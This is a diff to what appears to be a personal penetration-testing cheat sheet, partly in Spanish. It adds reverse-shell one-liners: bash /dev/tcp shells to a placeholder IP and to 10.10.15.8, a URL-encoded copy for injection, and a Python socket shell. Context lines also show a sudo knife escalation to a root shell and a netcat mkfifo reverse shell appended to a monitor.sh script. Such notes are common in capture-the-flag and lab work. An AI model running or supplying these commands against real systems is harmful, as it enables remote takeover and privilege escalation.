@@ -7,15 +7,18 @@ unified - terminal
 ```
 script /dev/null -c bash
 ```
-sqlmap - terminal
+
 ```
-bash -c "bash -i >& /dev/tcp/{your_IP}/333 0>&1"
+'bash -c "bash -i >& /dev/tcp/YOUR_IP}/333 0>&1"'
+/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/333 0>&1"
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.8/333 0>&1'
+%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.8%2F333%200%3E%261'
+/bin/bash -c 'python3 -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("YOUR_IP",333)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/sh")'\'''
 ```
 knife - terminal
 ```bash
 sudo /usr/bin/knife exec -E 'system("/bin/bash")'
 ```
-
 linux
 ```
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 33 >/tmp/f' | tee -a monitor.sh
@@ -78,3 +81,4 @@ dpkg -l | grep -i polkit
 - **`tmux kill-session -t ABC`** : eliminacion 
 
 - **`tmux set-environment -t ABC MI_VARIABLE "mi_valor"`**
+
